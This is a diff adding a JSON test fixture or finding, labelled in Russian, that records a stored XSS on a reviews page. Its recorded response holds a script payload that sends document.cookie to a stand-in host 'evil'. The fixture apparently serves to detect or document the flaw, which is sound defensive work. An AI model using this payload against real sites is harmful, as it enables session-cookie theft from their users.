@@ -1,0 +1,8 @@
+{
+  "name": "08b_xss_render",
+  "title": "Хранимый XSS: отдача без экранирования",
+  "request": "GET /reviews/view",
+  "status": 200,
+  "response": "<html><body><p><script>document.location='http://evil/'+document.cookie</script></p></body></html>",
+  "verdict": "<script> отдан как есть в HTML"
+}
